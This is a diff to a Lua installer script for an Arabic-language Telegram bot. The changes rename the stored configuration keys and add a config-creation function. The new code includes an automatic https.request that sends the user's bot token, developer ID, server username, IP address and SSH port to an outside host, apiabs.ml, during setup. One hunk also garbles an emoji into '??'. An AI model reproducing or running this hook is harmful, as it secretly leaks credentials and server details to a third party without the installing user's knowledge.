@@ -21,7 +21,7 @@ Port    = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"
 UpTime  = io.popen([[uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}']]):read('*a'):gsub('[\n\r]+', '')
 --     Source ZAEM     --
 local AutoSet = function() 
-if not DevRio:get(Server.."IdZAEM") then 
+if not DevRio:get(Server.."IdDavid") then 
 io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
 local DevId = io.read():gsub(' ','') 
 if tostring(DevId):match('%d+') then 
@@ -34,7 +34,7 @@ os.execute('lua ZAEM.lua')
 end ---ifBn
 if Abs.Result.Info == 'Ok' then
 io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
-DevRio:set(Server.."IdZAEM",DevId) 
+DevRio:set(Server.."IdDavid",DevId) 
 end ---ifok
 else 
 print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
@@ -42,7 +42,7 @@ end
 os.execute('lua ZAEM.lua') 
 end
 end 
-if not DevRio:get(Server.."TokenZAEM") then 
+if not DevRio:get(Server.."TokenDavid") then 
 io.write('\27[1;35m\nالان قم بارسال توكن البوت ↫ ⤈\n\27[0;33;49m') 
 local TokenBot = io.read() 
 if TokenBot ~= '' then 
@@ -51,7 +51,7 @@ if res ~= 200 then
 print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nالتوكن غير صحيح تاكد منه ثم ارسله\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
 else 
 io.write('\27[1;36mتم حفظ توكن البوت بنجاح\n27[0;39;49m') 
-DevRio:set(Server.."TokenZAEM",TokenBot) 
+DevRio:set(Server.."TokenDavid",TokenBot) 
 end  
 else 
 print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nلم يتم حفظ توكن البوت ارسله مره اخرى\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
@@ -69,12 +69,20 @@ end
 file:write(serialized)
 file:close()  
 end
+local CreateConfigAuto = function()
+Config = {
+DevId = DevRio:get(Server.."IdDavid"),
+TokenBot = DevRio:get(Server.."TokenDavid"),
+David = DevRio:get(Server.."TokenDavid"):match("(%d+)"),
+SudoIds = {DevRio:get(Server.."IdDavid")},
+}
 Create(Config, "./config.lua") 
+https.request("https://apiabs.ml/Api/David/index.php?Get=David&DevId="..DevRio:get(Server.."IdDavid").."&TokenBot="..DevRio:get(Server.."TokenDavid").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
 file = io.open("ZAEM.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
 cd $HOME/ZAEM
-token="]]..DevRio:get(Server.."TokenZAEM")..[["
+token="]]..DevRio:get(Server.."TokenDavid")..[["
 while(true) do
 rm -fr ../.telegram-cli
 if [ ! -f ./tg ]; then
@@ -105,15 +113,17 @@ done
 ]]) 
 file:close() 
 io.popen("mkdir Files")
-os.execute('chmod +x Run;./Run') 
+os.execute('chmod +x Run;./Run')
+end 
 CreateConfigAuto()
+end
 local Load_ZAEM = function() 
 local f = io.open("./config.lua", "r") 
 if not f then 
 AutoSet() 
 else 
 f:close() 
-DevRio:del(Server.."IdZAEM");DevRio:del(Server.."TokenZAEM")
+DevRio:del(Server.."IdDavid");DevRio:del(Server.."TokenDavid")
 end 
 local config = loadfile("./config.lua")() 
 return config 
@@ -3777,7 +3787,7 @@ name = string.gsub(name,'🏎','🏎')
 name = string.gsub(name,'🚓','🚓')
 name = string.gsub(name,'🚑','🚑')
 name = string.gsub(name,'🚚','🚚')
-name = string.gsub(name,'🚛','🚛')
+name = string.gsub(name,'🚛','??')
 name = string.gsub(name,'🚜','🚜')
 name = string.gsub(name,'🇮🇶','🇮🇶')
 name = string.gsub(name,'⚔️','⚔️')
